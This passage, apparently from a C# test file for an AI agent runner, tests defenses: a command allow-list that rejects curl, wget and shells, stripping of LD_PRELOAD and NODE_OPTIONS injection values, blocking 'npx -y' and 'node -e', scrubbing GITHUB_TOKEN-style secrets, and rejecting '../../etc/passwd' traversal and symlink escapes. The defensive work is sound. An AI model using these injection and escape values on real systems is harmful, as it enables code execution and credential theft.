        var skillsRoot = Path.Combine(pluginRoot, "skills");
        var safeSkill = Path.Combine(skillsRoot, "safe");
        var outsideSkill = Path.Combine(root, "outside", "linked");
        Directory.CreateDirectory(safeSkill);
        Directory.CreateDirectory(outsideSkill);
        File.WriteAllText(Path.Combine(safeSkill, "SKILL.md"), """
            ---
            name: safe
            description: Safe skill.
            ---
            Safe.
            """);
        File.WriteAllText(Path.Combine(outsideSkill, "SKILL.md"), """
            ---
            name: linked
            description: External skill.
            ---
            External.
            """);
        File.WriteAllText(Path.Combine(outsideSkill, "secret.txt"), "secret");
        File.WriteAllText(Path.Combine(pluginRoot, "plugin.json"), """
            {"name":"demo","version":"1.0.0","description":"Demo","skills":["./skills/"]}
            """);
        var linkedSkill = Path.Combine(skillsRoot, "linked");
        if (!SymlinkTestHelper.TryCreateDirectory(linkedSkill, outsideSkill))
        {
            Directory.Delete(root, true);
            return;
        }

        try
        {
            var config = await AgentRunner.BuildSessionConfig(
                MockSkill,
                pluginRoot,
                "gpt-4.1",
                Path.Combine(root, "work"));

            var stagedRoot = Assert.ContainsSingle(config.SkillDirectories!);
            Assert.IsTrue(File.Exists(Path.Combine(stagedRoot, "safe", "SKILL.md")));
            Assert.IsFalse(Directory.Exists(Path.Combine(stagedRoot, "linked")));
            Assert.IsFalse(AgentRunner.CheckPermission(
                Path.Combine(linkedSkill, "secret.txt"),
                Path.Combine(root, "work"),
                skillPath: null,
                log: null,
                pluginRoot: pluginRoot));
        }
        finally
        {
            Directory.Delete(root, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginSkillRunRegistersOnlyDeclaredAgentDependencies()
    {
        var pluginRoot = Path.Combine(Path.GetTempPath(), $"skill-plugin-{Guid.NewGuid():N}");
        var skillDir = Path.Combine(pluginRoot, "skills", "target-skill");
        var agentsDir = Path.Combine(pluginRoot, "agents");
        Directory.CreateDirectory(skillDir);
        Directory.CreateDirectory(agentsDir);
        File.WriteAllText(Path.Combine(skillDir, "SKILL.md"), """
            ---
            name: target-skill
            description: Target skill.
            ---
            Target.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "declared.agent.md"), """
            ---
            name: declared
            description: Declared dependency.
            ---
            Declared.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "unrelated.agent.md"), """
            ---
            name: unrelated
            description: Unrelated plugin agent.
            ---
            Unrelated.
            """);
        File.WriteAllText(Path.Combine(pluginRoot, "plugin.json"), """
            {
              "name": "demo",
              "version": "1.0.0",
              "description": "Demo",
              "skills": ["./skills/"],
              "agents": ["./agents/"]
            }
            """);
        try
        {
            var targetSkill = Assert.ContainsSingle(
                (await SkillDiscovery.DiscoverSkills(Path.Combine(pluginRoot, "skills")))
                    .Where(skill => skill.Name == "target-skill"));
            var declaredAgent = Assert.ContainsSingle(
                (await AgentDiscovery.DiscoverAgentsInPlugin(pluginRoot))
                    .Where(agent => agent.Name == "declared"));

            var config = await AgentRunner.BuildSessionConfig(
                skill: targetSkill,
                pluginRoot: pluginRoot,
                model: "gpt-4.1",
                workDir: "C:\\tmp\\work",
                additionalAgents: [declaredAgent]);

            Assert.AreEqual("declared", Assert.ContainsSingle(config.CustomAgents!).Name);
        }
        finally
        {
            Directory.Delete(pluginRoot, true);
        }
    }
}

[TestClass]
public class RunEventBufferTests
{
    [TestMethod]
    public void ConcurrentRecordsPreserveEventsAndOutput()
    {
        const int eventCount = 10_000;
        var buffer = new RunEventBuffer();

        Parallel.For(0, eventCount, index =>
            buffer.Record("assistant.message_delta", (agentEvent, output) =>
            {
                agentEvent.Data["index"] = JsonValue.Create(index);
                output.Append('x');
            }));

        var (events, output) = buffer.Snapshot();

        Assert.AreEqual(eventCount, events.Count);
        Assert.AreEqual(eventCount, output.Length);
        Assert.AreEqual(
            eventCount,
            events.Select(agentEvent => agentEvent.Data["index"]!.GetValue<int>())
                .Distinct()
                .Count());
    }
}

[TestClass]
public class ExtractPathFromToolArgsTests
{
    private static PreToolUseHookInput MakeInput(JsonElement? toolArgs) =>
        new() { ToolArgs = toolArgs };

    [TestMethod]
    public void ExtractsPathKey()
    {
        var args = JsonDocument.Parse("""{"path": "/tmp/work/file.txt"}""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.AreEqual("/tmp/work/file.txt", result);
    }

    [TestMethod]
    public void ExtractsFileNameKey()
    {
        var args = JsonDocument.Parse("""{"fileName": "src/Program.cs"}""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.AreEqual("src/Program.cs", result);
    }

    [TestMethod]
    public void IgnoresFullCommandText()
    {
        var args = JsonDocument.Parse("""{"fullCommandText": "dotnet build"}""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.IsNull(result);
    }

    [TestMethod]
    public void PrefersPathOverFileName()
    {
        var args = JsonDocument.Parse("""{"fullCommandText": "cmd", "fileName": "f.cs", "path": "/p"}""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.AreEqual("/p", result);
    }

    [TestMethod]
    public void ReturnsNullWhenToolArgsIsNull()
    {
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(null));
        Assert.IsNull(result);
    }

    [TestMethod]
    public void ReturnsNullWhenToolArgsIsNotObject()
    {
        var args = JsonDocument.Parse("""42""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.IsNull(result);
    }

    [TestMethod]
    public void ReturnsNullWhenNoKnownKeysPresent()
    {
        var args = JsonDocument.Parse("""{"content": "hello", "other": 123}""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.IsNull(result);
    }

    [TestMethod]
    public void ReturnsNullWhenKeyIsNotString()
    {
        var args = JsonDocument.Parse("""{"path": 42}""").RootElement;
        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
        Assert.IsNull(result);
    }
}

[TestClass]
public class IsAllowedMcpCommandTests
{
    [TestMethod]
    [DataRow("dotnet", true)]
    [DataRow("node", true)]
    [DataRow("npx", true)]
    [DataRow("python", true)]
    [DataRow("python3", true)]
    [DataRow("uvx", true)]
    [DataRow("bash", false)]
    [DataRow("sh", false)]
    [DataRow("curl", false)]
    [DataRow("wget", false)]
    [DataRow("cmd", false)]
    [DataRow("powershell", false)]
    public void ValidatesCommand(string command, bool expected)
    {
        Assert.AreEqual(expected, AgentRunner.IsAllowedMcpCommand(command));
    }

    [TestMethod]
    [DataRow("/usr/bin/dotnet", false)]
    [DataRow("/usr/local/bin/python3", false)]
    [DataRow("C:\\Program Files\\dotnet\\dotnet.exe", false)]
    [DataRow("/usr/bin/curl", false)]
    [DataRow("./dotnet", false)]
    [DataRow("../dotnet", false)]
    public void RejectsFullPaths(string command, bool expected)
    {
        Assert.AreEqual(expected, AgentRunner.IsAllowedMcpCommand(command));
    }
}

[TestClass]
public class ScrubSensitiveEnvironmentTests
{
    [TestMethod]
    public void RemovesKnownSensitiveKeys()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["GITHUB_TOKEN"] = "ghp_secret";
        psi.Environment["ACTIONS_RUNTIME_TOKEN"] = "token";
        psi.Environment["NPM_TOKEN"] = "npm_token";
        psi.Environment["NUGET_API_KEY"] = "nuget_key";
        psi.Environment["SAFE_VAR"] = "keep";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsFalse(psi.Environment.ContainsKey("GITHUB_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("ACTIONS_RUNTIME_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("NPM_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("NUGET_API_KEY"));
        Assert.AreEqual("keep", psi.Environment["SAFE_VAR"]);
    }

    [TestMethod]
    public void RemovesCopilotPrefixedKeys()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["COPILOT_SESSION_ID"] = "sess_123";
        psi.Environment["COPILOT_TOKEN"] = "token";
        psi.Environment["GH_AW_SECRET"] = "secret";
        psi.Environment["SAFE_VAR"] = "keep";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsFalse(psi.Environment.ContainsKey("COPILOT_SESSION_ID"));
        Assert.IsFalse(psi.Environment.ContainsKey("COPILOT_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("GH_AW_SECRET"));
        Assert.AreEqual("keep", psi.Environment["SAFE_VAR"]);
    }

    [TestMethod]
    public void PrefixMatchIsCaseInsensitive()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["copilot_lower"] = "val";
        psi.Environment["Copilot_Mixed"] = "val";
        psi.Environment["gh_aw_lower"] = "val";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsFalse(psi.Environment.ContainsKey("copilot_lower"));
        Assert.IsFalse(psi.Environment.ContainsKey("Copilot_Mixed"));
        Assert.IsFalse(psi.Environment.ContainsKey("gh_aw_lower"));
    }

    [TestMethod]
    public void DoesNotThrowWhenKeysAbsent()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["PATH"] = "/usr/bin";

        // Should not throw even though sensitive keys are not present
        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsTrue(psi.Environment.ContainsKey("PATH"));
    }
}

[TestClass]
public class SanitizeMcpEnvTests
{
    [TestMethod]
    public void ReturnsNullForNullInput()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpEnv(null));
    }

    [TestMethod]
    public void ReturnsNullForEmptyInput()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpEnv([]));
    }

    [TestMethod]
    public void StripsDangerousKeys()
    {
        var env = new Dictionary<string, string>
        {
            ["PATH"] = "/tmp/evil",
            ["LD_PRELOAD"] = "/tmp/evil.so",
            ["NODE_OPTIONS"] = "--require=evil",
            ["DOTNET_STARTUP_HOOKS"] = "/tmp/hook.dll",
            ["MY_SAFE_VAR"] = "hello",
        };

        var result = AgentRunner.SanitizeMcpEnv(env);

        Assert.IsNotNull(result);
        Assert.ContainsSingle(result);
        Assert.AreEqual("hello", result["MY_SAFE_VAR"]);
    }

    [TestMethod]
    public void ReturnsNullWhenAllKeysAreDangerous()
    {
        var env = new Dictionary<string, string>
        {
            ["PATH"] = "/evil",
            ["LD_PRELOAD"] = "/evil.so",
        };

        Assert.IsNull(AgentRunner.SanitizeMcpEnv(env));
    }

    [TestMethod]
    public void IsCaseInsensitive()
    {
        var env = new Dictionary<string, string>
        {
            ["path"] = "/tmp/evil",
            ["Node_Options"] = "--evil",
            ["safe_key"] = "ok",
        };

        var result = AgentRunner.SanitizeMcpEnv(env);

        Assert.IsNotNull(result);
        Assert.ContainsSingle(result);
        Assert.AreEqual("ok", result["safe_key"]);
    }
}

[TestClass]
public class SanitizeMcpArgsTests
{
    [TestMethod]
    public void AllowsSafeNodeArgs()
    {
        var result = AgentRunner.SanitizeMcpArgs("node", ["dist/server.js", "--stdio"]);
        Assert.IsNotNull(result);
        Assert.AreEqual(2, result.Length);
    }

    [TestMethod]
    [DataRow("-e")]
    [DataRow("--eval")]
    [DataRow("-p")]
    [DataRow("--print")]
    public void RejectsDangerousNodeArgs(string flag)
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs("node", [flag, "process.exit()"]));
    }

    [TestMethod]
    [DataRow("-c")]
    [DataRow("-m")]
    public void RejectsDangerousPythonArgs(string flag)
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs("python3", [flag, "evil"]));
    }

    [TestMethod]
    public void RejectsNpxAutoInstall()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs("npx", ["-y", "evil-pkg"]));
        Assert.IsNull(AgentRunner.SanitizeMcpArgs("npx", ["--yes", "evil-pkg"]));
    }

    [TestMethod]
    public void AllowsSafeNpxArgs()
    {
        var result = AgentRunner.SanitizeMcpArgs("npx", ["@modelcontextprotocol/server-filesystem", "/tmp"]);
        Assert.IsNotNull(result);
    }

    [TestMethod]
    public void AllowsUnknownCommandArgs()
    {
        // dotnet has no dangerous args list, so all args pass through
        var result = AgentRunner.SanitizeMcpArgs("dotnet", ["run", "--project", "src/Server"]);
        Assert.IsNotNull(result);
    }

    [TestMethod]
    public void RejectsUvxFromFlag()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs("uvx", ["--from", "evil-pkg", "serve"]));
    }
}

[TestClass]
public class CheckPermissionTests
{
    // Use platform-appropriate paths for cross-platform test compatibility
    private static readonly string WorkDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
    private static readonly string SkillDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "skills", "test-skill"));

    [TestMethod]
    public void ApprovesPathsInsideWorkDir()
    {
        var filePath = Path.Combine(WorkDir, "file.txt");
        var result = AgentRunner.CheckPermission(filePath, WorkDir, null, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void ApprovesPathsInsideSkillPath()
    {
        var filePath = Path.Combine(SkillDir, "SKILL.md");
        var result = AgentRunner.CheckPermission(filePath, WorkDir, SkillDir, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void ApprovesPathsInsideAdditionalAllowedDirs()
    {
        var stagingDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "sv-iso-abc123", "my-skill"));
        var refPath = Path.Combine(stagingDir, "references", "guide.md");
        var result = AgentRunner.CheckPermission(refPath, WorkDir, null, log: null,
            additionalAllowedDirs: [stagingDir]);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void DeniesPathsOutsideAllowedDirectories()
    {
        var outsidePath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "secret", "config"));
        var result = AgentRunner.CheckPermission(outsidePath, WorkDir, null, log: null);
        Assert.IsFalse(result);
    }

    [TestMethod]
    public void AllowsNullPath()
    {
        var result = AgentRunner.CheckPermission(null, WorkDir, null, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void DeniesPathsOutsideWorkDirWhenNoSkillPath()
    {
        var outsidePath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "other"));
        var result = AgentRunner.CheckPermission(outsidePath, WorkDir, null, log: null);
        Assert.IsFalse(result);
    }

    [TestMethod]
    public void DeniesPathsWithSharedPrefixButDifferentDirectory()
    {
        var attackerPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work-attacker", "evil.sh"));
        var result = AgentRunner.CheckPermission(attackerPath, WorkDir, null, log: null);
        Assert.IsFalse(result);
    }

    [TestMethod]
    public void AllowsEmptyStringPath()
    {
        var result = AgentRunner.CheckPermission("", WorkDir, null, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void ApprovesCommandPathInsideTempDir()
    {
        var cmdPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "bin", "tool"));
        var result = AgentRunner.CheckPermission(cmdPath, Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar), null, log: null);
        Assert.IsTrue(result);
    }
}

[TestClass]
public class ResolveSourcePathTests
{
    [TestMethod]
    public void ResolvesRelativeToEvalDirectory()
    {
        // Create a temp directory with a fixture file
        var tmpDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var fixturesDir = Path.Combine(tmpDir, "fixtures");
        Directory.CreateDirectory(fixturesDir);
        var fixtureFile = Path.Combine(fixturesDir, "test.txt");
        File.WriteAllText(fixtureFile, "test");
        try
        {
            var evalPath = Path.Combine(tmpDir, "eval.yaml");
            var result = AgentRunner.ResolveSourcePath("fixtures/test.txt", evalPath, skillPath: null);
            Assert.IsNotNull(result);
            Assert.AreEqual(Path.GetFullPath(fixtureFile), result);
        }
        finally
        {
            Directory.Delete(tmpDir, true);
        }
    }

    [TestMethod]
    public void FallsBackToSkillPathWhenEvalPathIsNull()
    {
        var tmpDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var fixturesDir = Path.Combine(tmpDir, "fixtures");
        Directory.CreateDirectory(fixturesDir);
        var fixtureFile = Path.Combine(fixturesDir, "data.cs");
        File.WriteAllText(fixtureFile, "// code");
        try
        {
            var result = AgentRunner.ResolveSourcePath("fixtures/data.cs", evalPath: null, skillPath: tmpDir);
            Assert.IsNotNull(result);
            Assert.AreEqual(Path.GetFullPath(fixtureFile), result);
        }
        finally
        {
            Directory.Delete(tmpDir, true);
        }
    }

    [TestMethod]
    public void ReturnsNullWhenBothPathsAreNull()
    {
        var result = AgentRunner.ResolveSourcePath("fixtures/test.txt", evalPath: null, skillPath: null);
        Assert.IsNull(result);
    }

    [TestMethod]
    public void RejectsPathTraversal()
    {
        var tmpDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tmpDir);
        try
        {
            var evalPath = Path.Combine(tmpDir, "eval.yaml");
            var result = AgentRunner.ResolveSourcePath("../../etc/passwd", evalPath, skillPath: null);
            Assert.IsNull(result);
        }
        finally
        {
            Directory.Delete(tmpDir, true);
        }
    }

    [TestMethod]
    public void PrefersEvalPathOverSkillPath()
    {
        var evalDir = Path.Combine(Path.GetTempPath(), $"sv-eval-{Guid.NewGuid():N}");
        var skillDir = Path.Combine(Path.GetTempPath(), $"sv-skill-{Guid.NewGuid():N}");
        Directory.CreateDirectory(Path.Combine(evalDir, "fixtures"));
        Directory.CreateDirectory(Path.Combine(skillDir, "fixtures"));
        File.WriteAllText(Path.Combine(evalDir, "fixtures", "f.txt"), "eval");
        File.WriteAllText(Path.Combine(skillDir, "fixtures", "f.txt"), "skill");
        try
        {
            var evalPath = Path.Combine(evalDir, "eval.yaml");
            var result = AgentRunner.ResolveSourcePath("fixtures/f.txt", evalPath, skillPath: skillDir);
            Assert.IsNotNull(result);
            // Should resolve to eval directory, not skill directory
            Assert.StartsWith(Path.GetFullPath(evalDir), result);
        }
        finally
        {
            Directory.Delete(evalDir, true);
            Directory.Delete(skillDir, true);
        }
    }
}
